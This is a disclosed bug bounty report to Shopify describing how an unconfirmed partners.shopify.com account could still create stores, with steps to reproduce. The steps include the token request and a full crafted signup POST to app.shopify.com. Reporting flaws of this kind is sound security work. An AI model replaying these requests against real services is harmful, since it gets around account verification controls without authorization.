# Add store to new partner account without confirming email address.

## Report Details
- **Report ID**: 633371
- **URL**: https://hackerone.com/reports/633371
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-07-02T00:25:53.340Z
- **Disclosed**: 2020-01-02T15:14:03.756Z

## Reporter
- **Username**: jmp_35p
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Details
When a someone signs up for a new account on partners.shopify.com they are asked to confirm their email address before they can do anything and by anything I mean add stores, invite members, use 
affiliate tools and so on. Apparently they can leverage an issue on partners.shopify.com to create stores on app.shopify.com without confirming their email address.

Setup
1. A new test account on partners.shopify.com.
2. Don't confirm email after signing up.
3. A partner account ID - say 1234
4. Shop name - say attacker

Step to reproduce.
1. While logged in send the following to the server to obtain an access token
GET /1234/stores/signup_object/dev_store 
Host: partners.shopify.com
2. You should get a request similar to {"extra":{"affiliate_shop":"eyJfcmFpbHMiOnsibWVzc2FnZSI6ImV5SndiR0Z1WDNOd1pXTWlPbn....."},"signup_source":"development shop","signup_types":["affiliate_shop"],"previous_page":"https://partners.shopify.com/1234/stores"}
3. Finally, to create the shop, do the following:
POST /services/signup/create HTTP/1.1
Host: app.shopify.com
....
<snipped>
....
_orig_referrer=https%3A%2F%2Fpartners.shopify.com%2F1234%2Fstores%2Fnew%3Fstore_type%3Ddev_store
_y=&ref=&ssid=&source=&source_url=&signup_code=&signup_source=development+shop&signup_source_details=build_store_for_client&forwarded_host=&signup_page=&signup_locale=&signup%5Bshop_name%5D=attacker&signup%5Bsubdomain%5D=&signup%5Bfirst_name%5D=&signup%5Blast_name%5D=&signup%5Bemail%5D=attacker%40domain.com&signup%5Bpassword%5D={shop-password-here}&signup%5Bconfirm_password%5D={shop_password_here}signup%5Baddress1%5D=Beverly+Hills&signup%5Bcity%5D=Los+Angeles&signup%5Bprovince%5D=CA&signup%5Bzip%5D=90210&signup%5Bcountry%5D=US&signup%5Bphone%5D=&signup%5Bpos%5D=&signup%5Bextra%5D%5Baffiliate_shop%5D={access_token_here}&signup%5Bextra%5D%5Borganization_id%5D=1234&signup%5Bextra%5D%5Bpartner_test_shop%5D=&signup%5Bsignup_types%5D%5B%5D=affiliate_shop

Note: Every occurrence of "1234" should be replaced with the partner account ID created above. In case you have troubles reproducing the issue I will be glad to help out.

## Impact

A user can still find a way around stores creation without confirm email first.

## Attachments
No attachments
